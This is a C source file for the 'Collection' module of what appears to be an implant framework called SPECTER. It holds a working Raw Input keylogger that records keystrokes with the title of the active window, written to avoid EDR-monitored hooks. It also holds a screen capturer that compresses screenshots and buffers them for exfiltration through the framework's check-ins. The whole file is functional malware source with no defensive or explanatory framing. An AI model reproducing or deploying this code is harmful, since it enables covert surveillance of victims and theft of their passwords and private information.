/**
 * SPECTER Module — Collection (Keylogger + Screenshots)
 *
 * Two collection capabilities, both time-boxed and buffered for
 * exfiltration via normal check-ins.
 *
 * Subcommands:
 *   "keylog"     <duration_sec>
 *       Raw Input keylogger: RegisterRawInputDevices + GetRawInputData
 *       via bus->resolve().  Buffers keystrokes with timestamps and
 *       foreground window title.  Time-boxed, outputs on completion.
 *       (No SetWindowsHookEx — heavily monitored by EDR.)
 *
 *   "screenshot"  [interval_sec] [count]
 *       GDI screen capture: CreateDCA("DISPLAY") + BitBlt.
 *       Captures BMP, LZ4-compresses, outputs via bus->output().
 *       Time-boxed count, configurable interval.
 *
 * Build: make modules  (produces build/modules/collect.bin)
 */

#include "module.h"

/* ------------------------------------------------------------------ */
/*  Inline CRT primitives (modules are standalone PIC blobs)           */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s)
{
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

int spec_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

void *spec_memset(void *dst, int c, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

void *spec_memcpy(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

/* Keylogger */
#define KEYLOG_BUF_SIZE         (16 * 1024)   /* 16 KB keystroke buffer */
#define KEYLOG_MAX_DURATION     600           /* 10 minutes max         */
#define KEYLOG_DEFAULT_DURATION 30            /* 30 seconds default     */

/* Screenshot */
#define SCREENSHOT_MAX_COUNT    100
#define SCREENSHOT_DEFAULT_COUNT    1
#define SCREENSHOT_DEFAULT_INTERVAL 5         /* 5 seconds default      */
#define BMP_HEADER_SIZE         54            /* BITMAPFILEHEADER + BITMAPINFOHEADER */

/* Memory permissions */
#define PAGE_READWRITE          0x04

/* Raw Input constants */
#define RID_INPUT               0x10000003
#define RIM_TYPEKEYBOARD        1
#define RIDEV_INPUTSINK         0x00000100
#define HID_USAGE_PAGE_GENERIC  0x01
#define HID_USAGE_KEYBOARD      0x06

/* Window message constants */
#define WM_INPUT                0x00FF
#define PM_REMOVE               0x0001
#define PM_NOREMOVE             0x0000

/* GDI constants */
#define SRCCOPY                 0x00CC0020
#define BI_RGB                  0
#define DIB_RGB_COLORS          0

/* Virtual key codes */
#define VK_SHIFT                0x10
#define VK_CONTROL              0x11
#define VK_MENU                 0x12
#define VK_CAPITAL              0x14
#define VK_RETURN               0x0D
#define VK_TAB                  0x09
#define VK_BACK                 0x08
#define VK_SPACE                0x20
#define VK_ESCAPE               0x1B

/* Key transition flags */
#define RI_KEY_BREAK            0x01
#define RI_KEY_MAKE             0x00

/* GetSystemMetrics indices */
#define SM_CXSCREEN             0
#define SM_CYSCREEN             1

/* ------------------------------------------------------------------ */
/*  Structures                                                         */
/* ------------------------------------------------------------------ */

#pragma pack(push, 1)

/* Raw Input structures */
typedef struct _RAWINPUTDEVICE_S {
    WORD    usUsagePage;
    WORD    usUsage;
    DWORD   dwFlags;
    HANDLE  hwndTarget;
} RAWINPUTDEVICE_S;

typedef struct _RAWINPUTHEADER_S {
    DWORD   dwType;
    DWORD   dwSize;
    HANDLE  hDevice;
    ULONG_PTR wParam;
} RAWINPUTHEADER_S;

typedef struct _RAWKEYBOARD_S {
    WORD    MakeCode;
    WORD    Flags;
    WORD    Reserved;
    WORD    VKey;
    DWORD   Message;
    DWORD   ExtraInformation;
} RAWKEYBOARD_S;

typedef struct _RAWINPUT_S {
    RAWINPUTHEADER_S header;
    union {
        RAWKEYBOARD_S keyboard;
        BYTE          pad[40]; /* union padding for other types */
    } data;
} RAWINPUT_S;

/* MSG structure for PeekMessage */
typedef struct _MSG_S {
    HANDLE  hwnd;
    DWORD   message;
    ULONG_PTR wParam;
    ULONG_PTR lParam;
    DWORD   time;
    LONG    pt_x;
    LONG    pt_y;
} MSG_S;

/* BMP file header */
typedef struct _BITMAPFILEHEADER_S {
    WORD    bfType;
    DWORD   bfSize;
    WORD    bfReserved1;
    WORD    bfReserved2;
    DWORD   bfOffBits;
} BITMAPFILEHEADER_S;

/* BMP info header */
typedef struct _BITMAPINFOHEADER_S {
    DWORD   biSize;
    LONG    biWidth;
    LONG    biHeight;
    WORD    biPlanes;
    WORD    biBitCount;
    DWORD   biCompression;
    DWORD   biSizeImage;
    LONG    biXPelsPerMeter;
    LONG    biYPelsPerMeter;
    DWORD   biClrUsed;
    DWORD   biClrImportant;
} BITMAPINFOHEADER_S;

#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  Function pointer typedefs — Keylogger                              */
/* ------------------------------------------------------------------ */

typedef BOOL (*FN_RegisterRawInputDevices)(
    const RAWINPUTDEVICE_S *pRawInputDevices,
    DWORD uiNumDevices,
    DWORD cbSize
);

typedef DWORD (*FN_GetRawInputData)(
    HANDLE hRawInput,
    DWORD uiCommand,
    PVOID pData,
    PDWORD pcbSize,
    DWORD cbSizeHeader
);

typedef BOOL (*FN_PeekMessageA)(
    MSG_S *lpMsg,
    HANDLE hWnd,
    DWORD wMsgFilterMin,
    DWORD wMsgFilterMax,
    DWORD wRemoveMsg
);

typedef HANDLE (*FN_GetForegroundWindow)(void);

typedef int (*FN_GetWindowTextA)(
    HANDLE hWnd,
    char *lpString,
    int nMaxCount
);

typedef DWORD (*FN_GetTickCount)(void);

typedef void (*FN_Sleep)(DWORD dwMilliseconds);

typedef SHORT (*FN_GetKeyState)(int nVirtKey);

/* ------------------------------------------------------------------ */
/*  Function pointer typedefs — Screenshot                             */
/* ------------------------------------------------------------------ */

typedef HANDLE (*FN_CreateDCA)(
    const char *lpszDriver,
    const char *lpszDevice,
    const char *lpszOutput,
    PVOID lpInitData
);

typedef HANDLE (*FN_CreateCompatibleDC)(HANDLE hdc);

typedef HANDLE (*FN_CreateCompatibleBitmap)(
    HANDLE hdc, int cx, int cy
);

typedef HANDLE (*FN_SelectObject)(HANDLE hdc, HANDLE h);

typedef BOOL (*FN_BitBlt)(
    HANDLE hdc, int x, int y, int cx, int cy,
    HANDLE hdcSrc, int x1, int y1, DWORD rop
);

typedef int (*FN_GetDIBits)(
    HANDLE hdc, HANDLE hbm, DWORD start, DWORD cLines,
    PVOID lpvBits, PVOID lpbmi, DWORD usage
);

typedef BOOL (*FN_DeleteObject)(HANDLE ho);

typedef BOOL (*FN_DeleteDC)(HANDLE hdc);

typedef int (*FN_GetSystemMetrics)(int nIndex);

/* ------------------------------------------------------------------ */
/*  Helper: append string to buffer                                    */
/* ------------------------------------------------------------------ */

static DWORD buf_append(char *buf, DWORD buf_len, DWORD offset,
                         const char *str)
{
    while (*str && offset < buf_len - 1)
        buf[offset++] = *str++;
    buf[offset] = '\0';
    return offset;
}

/* ------------------------------------------------------------------ */
/*  Helper: uint to decimal string                                     */
/* ------------------------------------------------------------------ */

static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_len)
{
    char tmp[16];
    DWORD i = 0, j;

    if (buf_len < 2) return 0;
    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; return 1; }

    while (val > 0 && i < sizeof(tmp) - 1) {
        tmp[i++] = (char)('0' + (val % 10));
        val /= 10;
    }
    if (i >= buf_len) i = buf_len - 1;
    for (j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    buf[i] = '\0';
    return i;
}

static DWORD buf_append_uint(char *buf, DWORD buf_len, DWORD offset,
                              DWORD val)
{
    char tmp[16];
    uint_to_str(val, tmp, sizeof(tmp));
    return buf_append(buf, buf_len, offset, tmp);
}

/* ------------------------------------------------------------------ */
/*  Helper: VKey to printable character string                         */
/* ------------------------------------------------------------------ */

static DWORD vkey_to_str(WORD vkey, WORD flags, BOOL shift, BOOL caps,
                          char *out, DWORD out_len)
{
    if (out_len < 2) return 0;

    /* Special keys */
    switch (vkey) {
        case VK_RETURN:  return buf_append(out, out_len, 0, "[Enter]");
        case VK_TAB:     return buf_append(out, out_len, 0, "[Tab]");
        case VK_BACK:    return buf_append(out, out_len, 0, "[BS]");
        case VK_SPACE:   out[0] = ' '; out[1] = '\0'; return 1;
        case VK_ESCAPE:  return buf_append(out, out_len, 0, "[Esc]");
        case VK_SHIFT:
        case VK_CONTROL:
        case VK_MENU:
        case VK_CAPITAL:
            return 0;   /* Modifier keys — skip */
    }

    /* Alphanumeric */
    if (vkey >= 'A' && vkey <= 'Z') {
        BOOL upper = (shift ^ caps);  /* XOR: shift inverts caps */
        out[0] = upper ? (char)vkey : (char)(vkey + 0x20);
        out[1] = '\0';
        return 1;
    }

    /* Digits */
    if (vkey >= '0' && vkey <= '9') {
        if (shift) {
            const char shifted[] = ")!@#$%^&*(";
            out[0] = shifted[vkey - '0'];
        } else {
            out[0] = (char)vkey;
        }
        out[1] = '\0';
        return 1;
    }

    /* OEM keys (common US layout) */
    if (vkey >= 0xBA && vkey <= 0xE2) {
        const char oem_normal[] = ";=,-./`";
        const char oem_shift[]  = ":+<_>?~";
        DWORD idx = 0;
        switch (vkey) {
            case 0xBA: idx = 0; break;  /* ; */
            case 0xBB: idx = 1; break;  /* = */
            case 0xBC: idx = 2; break;  /* , */
            case 0xBD: idx = 3; break;  /* - */
            case 0xBE: idx = 4; break;  /* . */
            case 0xBF: idx = 5; break;  /* / */
            case 0xC0: idx = 6; break;  /* ` */
            default:
                out[0] = '?';
                out[1] = '\0';
                return 1;
        }
        out[0] = shift ? oem_shift[idx] : oem_normal[idx];
        out[1] = '\0';
        return 1;
    }

    /* Bracket keys */
    if (vkey == 0xDB) { out[0] = shift ? '{' : '['; out[1] = '\0'; return 1; }
    if (vkey == 0xDC) { out[0] = shift ? '|' : '\\'; out[1] = '\0'; return 1; }
    if (vkey == 0xDD) { out[0] = shift ? '}' : ']'; out[1] = '\0'; return 1; }
    if (vkey == 0xDE) { out[0] = shift ? '"' : '\''; out[1] = '\0'; return 1; }

    /* F-keys */
    if (vkey >= 0x70 && vkey <= 0x7B) {
        DWORD off = 0;
        off = buf_append(out, out_len, off, "[F");
        off = buf_append_uint(out, out_len, off, vkey - 0x70 + 1);
        off = buf_append(out, out_len, off, "]");
        return off;
    }

    /* Unknown */
    out[0] = '?';
    out[1] = '\0';
    return 1;
}

/* ------------------------------------------------------------------ */
/*  Minimal LZ4 compressor (block format, standalone)                  */
/* ------------------------------------------------------------------ */

#define LZ4_HASH_LOG            12
#define LZ4_HASH_SIZE           (1 << LZ4_HASH_LOG)
#define LZ4_SKIP_TRIGGER        6
#define LZ4_MIN_MATCH           4
#define LZ4_LAST_LITERALS       5
#define LZ4_MF_LIMIT            (LZ4_MIN_MATCH + 1)
#define LZ4_MAX_INPUT_SIZE      0x7E000000

static DWORD lz4_write_len(BYTE *dst, DWORD len)
{
    DWORD written = 0;
    while (len >= 255) {
        dst[written++] = 255;
        len -= 255;
    }
    dst[written++] = (BYTE)len;
    return written;
}

static DWORD lz4_compress(const BYTE *src, DWORD src_len,
                           BYTE *dst, DWORD dst_cap)
{
    WORD hash_table[LZ4_HASH_SIZE];
    const BYTE *src_end = src + src_len;
    const BYTE *match_limit = src_end - LZ4_LAST_LITERALS;
    const BYTE *mf_limit = src_end - LZ4_MF_LIMIT;
    const BYTE *anchor = src;
    const BYTE *ip = src + 1;
    BYTE *op = dst;
    BYTE *op_limit = dst + dst_cap;
    DWORD h, step, skip;

    if (src_len == 0 || src_len > LZ4_MAX_INPUT_SIZE) return 0;
    if (src_len < LZ4_MF_LIMIT + LZ4_LAST_LITERALS + 1) {
        /* Too small for any match — emit as all-literals */
        DWORD last_lit = src_len;
        DWORD needed = 1 + (last_lit >= 15 ? last_lit / 255 + 1 : 0) + last_lit;
        if (needed > dst_cap) return 0;
        BYTE token = (BYTE)((last_lit >= 15 ? 15 : last_lit) << 4);
        *op++ = token;
        if (last_lit >= 15) op += lz4_write_len(op, last_lit - 15);
        spec_memcpy(op, src, last_lit);
        op += last_lit;
        return (DWORD)(op - dst);
    }

    spec_memset(hash_table, 0, sizeof(hash_table));
    h = ((*(const DWORD *)src) * 2654435761U) >> (32 - LZ4_HASH_LOG);
    hash_table[h] = 0;

    while (ip < mf_limit) {
        const BYTE *ref;
        DWORD match_len, lit_len, token;

        step = 1;
        skip = 0;
        do {
            h = ((*(const DWORD *)ip) * 2654435761U) >> (32 - LZ4_HASH_LOG);
            ref = src + hash_table[h];
            hash_table[h] = (WORD)(ip - src);
            if (ip - ref > 0xFFFF) { ip++; skip++; if (skip >= LZ4_SKIP_TRIGGER) step++; continue; }
            if (*(const DWORD *)ref == *(const DWORD *)ip) break;
            ip += step; skip++; if (skip >= LZ4_SKIP_TRIGGER) step++;
        } while (ip < mf_limit);

        if (ip >= mf_limit) break;

        lit_len = (DWORD)(ip - anchor);
        {
            const BYTE *mp = ip + LZ4_MIN_MATCH;
            const BYTE *mr = ref + LZ4_MIN_MATCH;
            while (mp < match_limit && *mp == *mr) { mp++; mr++; }
            match_len = (DWORD)(mp - ip - LZ4_MIN_MATCH);
        }

        {
            DWORD needed = 1 + (lit_len >= 15 ? lit_len / 255 + 1 : 0) +
                           lit_len + 2 + (match_len >= 15 ? match_len / 255 + 1 : 0);
            if (op + needed > op_limit) return 0;
        }

        token = (lit_len >= 15 ? 15 : lit_len) << 4;
        token |= (match_len >= 15 ? 15 : match_len);
        *op++ = (BYTE)token;
        if (lit_len >= 15) op += lz4_write_len(op, lit_len - 15);
        spec_memcpy(op, anchor, lit_len);
        op += lit_len;
        { WORD ov = (WORD)(ip - ref); *op++ = (BYTE)(ov & 0xFF); *op++ = (BYTE)(ov >> 8); }
        if (match_len >= 15) op += lz4_write_len(op, match_len - 15);
        ip += match_len + LZ4_MIN_MATCH;
        anchor = ip;
    }

    {
        DWORD last_lit = (DWORD)(src_end - anchor);
        DWORD needed = 1 + (last_lit >= 15 ? last_lit / 255 + 1 : 0) + last_lit;
        if (op + needed > op_limit) return 0;
        BYTE token = (BYTE)((last_lit >= 15 ? 15 : last_lit) << 4);
        *op++ = token;
        if (last_lit >= 15) op += lz4_write_len(op, last_lit - 15);
        spec_memcpy(op, anchor, last_lit);
        op += last_lit;
    }

    return (DWORD)(op - dst);
}

/* ------------------------------------------------------------------ */
/*  Subcommand: keylog — Raw Input keylogger                           */
/* ------------------------------------------------------------------ */

static DWORD cmd_keylog(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    FN_RegisterRawInputDevices pRegisterRawInputDevices;
    FN_GetRawInputData         pGetRawInputData;
    FN_PeekMessageA            pPeekMessageA;
    FN_GetForegroundWindow     pGetForegroundWindow;
    FN_GetWindowTextA          pGetWindowTextA;
    FN_GetTickCount            pGetTickCount;
    FN_Sleep                   pSleep;
    FN_GetKeyState             pGetKeyState;

    DWORD duration_sec;
    DWORD start_tick, elapsed;
    BYTE *log_buf;
    DWORD log_off = 0;
    char last_window[128];
    RAWINPUTDEVICE_S rid;
    BOOL registered;

    /* arg[0]="keylog", arg[1]=duration_sec */
    duration_sec = module_arg_int32(args, 1, KEYLOG_DEFAULT_DURATION);
    if (duration_sec > KEYLOG_MAX_DURATION)
        duration_sec = KEYLOG_MAX_DURATION;

    /* Resolve APIs */
    pRegisterRawInputDevices = (FN_RegisterRawInputDevices)
        api->resolve("user32.dll", "RegisterRawInputDevices");
    pGetRawInputData = (FN_GetRawInputData)
        api->resolve("user32.dll", "GetRawInputData");
    pPeekMessageA = (FN_PeekMessageA)
        api->resolve("user32.dll", "PeekMessageA");
    pGetForegroundWindow = (FN_GetForegroundWindow)
        api->resolve("user32.dll", "GetForegroundWindow");
    pGetWindowTextA = (FN_GetWindowTextA)
        api->resolve("user32.dll", "GetWindowTextA");
    pGetTickCount = (FN_GetTickCount)
        api->resolve("kernel32.dll", "GetTickCount");
    pSleep = (FN_Sleep)
        api->resolve("kernel32.dll", "Sleep");
    pGetKeyState = (FN_GetKeyState)
        api->resolve("user32.dll", "GetKeyState");

    if (!pRegisterRawInputDevices || !pGetRawInputData ||
        !pPeekMessageA || !pGetTickCount || !pSleep) {
        MODULE_OUTPUT_ERROR(api, "collect keylog: failed to resolve APIs");
        return MODULE_ERR_RESOLVE;
    }

    /* Allocate keystroke buffer */
    log_buf = (BYTE *)api->mem_alloc(KEYLOG_BUF_SIZE, PAGE_READWRITE);
    if (!log_buf) {
        MODULE_OUTPUT_ERROR(api, "collect keylog: alloc failed");
        return MODULE_ERR_ALLOC;
    }

    spec_memset(last_window, 0, sizeof(last_window));

    /* Register for raw keyboard input */
    spec_memset(&rid, 0, sizeof(rid));
    rid.usUsagePage = HID_USAGE_PAGE_GENERIC;
    rid.usUsage     = HID_USAGE_KEYBOARD;
    rid.dwFlags     = RIDEV_INPUTSINK;
    rid.hwndTarget  = NULL;  /* No window — we poll with PeekMessage */

    registered = pRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE_S));
    if (!registered) {
        MODULE_OUTPUT_ERROR(api, "collect keylog: RegisterRawInputDevices failed");
        api->mem_free(log_buf);
        return MODULE_ERR_IO;
    }

    {
        char msg[128];
        DWORD off = 0;
        off = buf_append(msg, sizeof(msg), off, "collect keylog: started (");
        off = buf_append_uint(msg, sizeof(msg), off, duration_sec);
        off = buf_append(msg, sizeof(msg), off, "s)");
        MODULE_OUTPUT_TEXT(api, msg);
    }

    start_tick = pGetTickCount();

    /* Main capture loop */
    while (1) {
        MSG_S msg;
        BOOL shift_down, caps_on;

        elapsed = pGetTickCount() - start_tick;
        if (elapsed >= duration_sec * 1000)
            break;

        /* Check buffer space — leave room for window title changes */
        if (log_off >= KEYLOG_BUF_SIZE - 256)
            break;

        /* Track foreground window changes */
        if (pGetForegroundWindow && pGetWindowTextA) {
            char cur_window[128];
            HANDLE fg = pGetForegroundWindow();
            spec_memset(cur_window, 0, sizeof(cur_window));
            if (fg)
                pGetWindowTextA(fg, cur_window, sizeof(cur_window) - 1);

            if (spec_strcmp(cur_window, last_window) != 0 && cur_window[0]) {
                log_off = buf_append((char *)log_buf, KEYLOG_BUF_SIZE,
                                     log_off, "\n[");
                log_off = buf_append((char *)log_buf, KEYLOG_BUF_SIZE,
                                     log_off, cur_window);
                log_off = buf_append((char *)log_buf, KEYLOG_BUF_SIZE,
                                     log_off, "]\n");
                spec_memcpy(last_window, cur_window, sizeof(cur_window));
            }
        }

        /* Poll for WM_INPUT messages */
        while (pPeekMessageA(&msg, NULL, WM_INPUT, WM_INPUT, PM_REMOVE)) {
            RAWINPUT_S raw;
            DWORD raw_size = sizeof(RAWINPUT_S);

            if (pGetRawInputData((HANDLE)msg.lParam, RID_INPUT,
                                  &raw, &raw_size,
                                  sizeof(RAWINPUTHEADER_S)) != (DWORD)-1) {
                if (raw.header.dwType == RIM_TYPEKEYBOARD) {
                    /* Only process key-down events */
                    if (!(raw.data.keyboard.Flags & RI_KEY_BREAK)) {
                        char key_str[16];
                        DWORD key_len;

                        /* Check modifier states */
                        shift_down = FALSE;
                        caps_on = FALSE;
                        if (pGetKeyState) {
                            shift_down = (pGetKeyState(VK_SHIFT) & 0x8000) ? TRUE : FALSE;
                            caps_on = (pGetKeyState(VK_CAPITAL) & 0x0001) ? TRUE : FALSE;
                        }

                        spec_memset(key_str, 0, sizeof(key_str));
                        key_len = vkey_to_str(raw.data.keyboard.VKey,
                                              raw.data.keyboard.Flags,
                                              shift_down, caps_on,
                                              key_str, sizeof(key_str));

                        if (key_len > 0 && log_off + key_len < KEYLOG_BUF_SIZE - 1) {
                            spec_memcpy(log_buf + log_off, key_str, key_len);
                            log_off += key_len;
                            log_buf[log_off] = '\0';
                        }
                    }
                }
            }
        }

        /* Brief sleep to avoid CPU spin */
        pSleep(10);
    }

    /* Unregister raw input */
    rid.dwFlags = 0x00000001; /* RIDEV_REMOVE */
    rid.hwndTarget = NULL;
    pRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE_S));

    /* Output captured keystrokes */
    if (log_off > 0) {
        MODULE_OUTPUT_TEXT(api, (const char *)log_buf);
    } else {
        MODULE_OUTPUT_TEXT(api, "collect keylog: no keystrokes captured");
    }

    api->mem_free(log_buf);

    {
        char msg[128];
        DWORD off = 0;
        off = buf_append(msg, sizeof(msg), off, "collect keylog: completed (");
        off = buf_append_uint(msg, sizeof(msg), off, log_off);
        off = buf_append(msg, sizeof(msg), off, " bytes captured)");
        MODULE_OUTPUT_TEXT(api, msg);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: screenshot — GDI screen capture                        */
/* ------------------------------------------------------------------ */

static DWORD cmd_screenshot(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    FN_CreateDCA             pCreateDCA;
    FN_CreateCompatibleDC    pCreateCompatibleDC;
    FN_CreateCompatibleBitmap pCreateCompatibleBitmap;
    FN_SelectObject          pSelectObject;
    FN_BitBlt                pBitBlt;
    FN_GetDIBits             pGetDIBits;
    FN_DeleteObject          pDeleteObject;
    FN_DeleteDC              pDeleteDC;
    FN_GetSystemMetrics      pGetSystemMetrics;
    FN_Sleep                 pSleep;

    DWORD interval_sec;
    DWORD count;
    DWORD i;

    /* arg[0]="screenshot", arg[1]=interval_sec, arg[2]=count */
    interval_sec = module_arg_int32(args, 1, SCREENSHOT_DEFAULT_INTERVAL);
    count        = module_arg_int32(args, 2, SCREENSHOT_DEFAULT_COUNT);
    if (count > SCREENSHOT_MAX_COUNT) count = SCREENSHOT_MAX_COUNT;
    if (count == 0) count = 1;

    /* Resolve GDI APIs */
    pCreateDCA = (FN_CreateDCA)
        api->resolve("gdi32.dll", "CreateDCA");
    pCreateCompatibleDC = (FN_CreateCompatibleDC)
        api->resolve("gdi32.dll", "CreateCompatibleDC");
    pCreateCompatibleBitmap = (FN_CreateCompatibleBitmap)
        api->resolve("gdi32.dll", "CreateCompatibleBitmap");
    pSelectObject = (FN_SelectObject)
        api->resolve("gdi32.dll", "SelectObject");
    pBitBlt = (FN_BitBlt)
        api->resolve("gdi32.dll", "BitBlt");
    pGetDIBits = (FN_GetDIBits)
        api->resolve("gdi32.dll", "GetDIBits");
    pDeleteObject = (FN_DeleteObject)
        api->resolve("gdi32.dll", "DeleteObject");
    pDeleteDC = (FN_DeleteDC)
        api->resolve("gdi32.dll", "DeleteDC");
    pGetSystemMetrics = (FN_GetSystemMetrics)
        api->resolve("user32.dll", "GetSystemMetrics");
    pSleep = (FN_Sleep)
        api->resolve("kernel32.dll", "Sleep");

    if (!pCreateDCA || !pCreateCompatibleDC || !pCreateCompatibleBitmap ||
        !pSelectObject || !pBitBlt || !pGetDIBits || !pDeleteObject ||
        !pDeleteDC || !pGetSystemMetrics) {
        MODULE_OUTPUT_ERROR(api, "collect screenshot: failed to resolve GDI APIs");
        return MODULE_ERR_RESOLVE;
    }

    for (i = 0; i < count; i++) {
        int width, height;
        DWORD row_size, pixel_data_size, bmp_total;
        HANDLE hScreenDC, hMemDC, hBitmap, hOldBitmap;
        BYTE *bmp_buf;
        BYTE *comp_buf;
        DWORD comp_cap, comp_len;
        BITMAPFILEHEADER_S bfh;
        BITMAPINFOHEADER_S bih;

        /* Get screen dimensions */
        width = pGetSystemMetrics(SM_CXSCREEN);
        height = pGetSystemMetrics(SM_CYSCREEN);
        if (width <= 0 || height <= 0) {
            MODULE_OUTPUT_ERROR(api, "collect screenshot: invalid screen dimensions");
            return MODULE_ERR_IO;
        }

        /* Calculate BMP sizes (24-bit, rows aligned to 4 bytes) */
        row_size = (((DWORD)width * 3 + 3) / 4) * 4;
        pixel_data_size = row_size * (DWORD)height;
        bmp_total = BMP_HEADER_SIZE + pixel_data_size;

        /* Allocate BMP buffer */
        bmp_buf = (BYTE *)api->mem_alloc((SIZE_T)bmp_total, PAGE_READWRITE);
        if (!bmp_buf) {
            MODULE_OUTPUT_ERROR(api, "collect screenshot: alloc failed for BMP");
            return MODULE_ERR_ALLOC;
        }

        /* Create device contexts */
        hScreenDC = pCreateDCA("DISPLAY", NULL, NULL, NULL);
        if (!hScreenDC) {
            MODULE_OUTPUT_ERROR(api, "collect screenshot: CreateDCA failed");
            api->mem_free(bmp_buf);
            return MODULE_ERR_IO;
        }

        hMemDC = pCreateCompatibleDC(hScreenDC);
        if (!hMemDC) {
            MODULE_OUTPUT_ERROR(api, "collect screenshot: CreateCompatibleDC failed");
            pDeleteDC(hScreenDC);
            api->mem_free(bmp_buf);
            return MODULE_ERR_IO;
        }

        hBitmap = pCreateCompatibleBitmap(hScreenDC, width, height);
        if (!hBitmap) {
            MODULE_OUTPUT_ERROR(api, "collect screenshot: CreateCompatibleBitmap failed");
            pDeleteDC(hMemDC);
            pDeleteDC(hScreenDC);
            api->mem_free(bmp_buf);
            return MODULE_ERR_IO;
        }

        /* Select bitmap into memory DC and capture screen */
        hOldBitmap = pSelectObject(hMemDC, hBitmap);
        pBitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

        /* Set up BITMAPINFOHEADER for GetDIBits */
        spec_memset(&bih, 0, sizeof(bih));
        bih.biSize = sizeof(BITMAPINFOHEADER_S);
        bih.biWidth = (LONG)width;
        bih.biHeight = (LONG)height;
        bih.biPlanes = 1;
        bih.biBitCount = 24;
        bih.biCompression = BI_RGB;
        bih.biSizeImage = pixel_data_size;

        /* Get pixel data */
        pGetDIBits(hMemDC, hBitmap, 0, (DWORD)height,
                    bmp_buf + BMP_HEADER_SIZE,
                    (PVOID)&bih, DIB_RGB_COLORS);

        /* Build BMP file header */
        spec_memset(&bfh, 0, sizeof(bfh));
        bfh.bfType = 0x4D42;   /* "BM" */
        bfh.bfSize = bmp_total;
        bfh.bfOffBits = BMP_HEADER_SIZE;

        /* Write headers to buffer */
        spec_memcpy(bmp_buf, &bfh, sizeof(bfh));
        spec_memcpy(bmp_buf + sizeof(bfh), &bih, sizeof(bih));

        /* Cleanup GDI objects */
        pSelectObject(hMemDC, hOldBitmap);
        pDeleteObject(hBitmap);
        pDeleteDC(hMemDC);
        pDeleteDC(hScreenDC);

        /* LZ4 compress the BMP data */
        comp_cap = bmp_total + (bmp_total / 255) + 16;
        comp_buf = (BYTE *)api->mem_alloc((SIZE_T)comp_cap, PAGE_READWRITE);
        if (comp_buf) {
            comp_len = lz4_compress(bmp_buf, bmp_total, comp_buf, comp_cap);
            if (comp_len > 0 && comp_len < bmp_total) {
                /* Send compressed with header:
                   [4B screenshot_idx][4B original_size][4B compressed_size][compressed_data] */
                BYTE *out_buf = (BYTE *)api->mem_alloc(
                    (SIZE_T)(12 + comp_len), PAGE_READWRITE);
                if (out_buf) {
                    ((DWORD *)out_buf)[0] = i;           /* screenshot index */
                    ((DWORD *)out_buf)[1] = bmp_total;   /* original size */
                    ((DWORD *)out_buf)[2] = comp_len;    /* compressed size */
                    spec_memcpy(out_buf + 12, comp_buf, comp_len);
                    MODULE_OUTPUT_BINARY(api, out_buf, 12 + comp_len);
                    api->mem_free(out_buf);
                } else {
                    /* Fallback: send uncompressed */
                    MODULE_OUTPUT_BINARY(api, bmp_buf, bmp_total);
                }
            } else {
                /* Compression didn't help — send raw */
                MODULE_OUTPUT_BINARY(api, bmp_buf, bmp_total);
            }
            api->mem_free(comp_buf);
        } else {
            /* No memory for compression — send raw BMP */
            MODULE_OUTPUT_BINARY(api, bmp_buf, bmp_total);
        }

        api->mem_free(bmp_buf);

        /* Report progress */
        {
            char msg[64];
            DWORD off = 0;
            off = buf_append(msg, sizeof(msg), off, "collect screenshot: captured ");
            off = buf_append_uint(msg, sizeof(msg), off, i + 1);
            off = buf_append(msg, sizeof(msg), off, "/");
            off = buf_append_uint(msg, sizeof(msg), off, count);
            MODULE_OUTPUT_TEXT(api, msg);
        }

        /* Wait between captures */
        if (pSleep && i + 1 < count)
            pSleep(interval_sec * 1000);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Module entry point                                                 */
/* ------------------------------------------------------------------ */

DWORD module_entry(MODULE_BUS_API *api, BYTE *args_raw, DWORD args_len)
{
    MODULE_ARGS  args;
    const char  *subcmd;

    if (!module_parse_args(args_raw, args_len, &args)) {
        MODULE_OUTPUT_ERROR(api, "collect: failed to parse arguments");
        return MODULE_ERR_ARGS;
    }

    subcmd = module_arg_string(&args, 0);
    if (!subcmd) {
        MODULE_OUTPUT_ERROR(api, "collect: missing subcommand (keylog|screenshot)");
        return MODULE_ERR_ARGS;
    }

    if (spec_strcmp(subcmd, "keylog") == 0)
        return cmd_keylog(api, &args);

    if (spec_strcmp(subcmd, "screenshot") == 0)
        return cmd_screenshot(api, &args);

    MODULE_OUTPUT_ERROR(api, "collect: unknown subcommand");
    return MODULE_ERR_UNSUPPORTED;
}
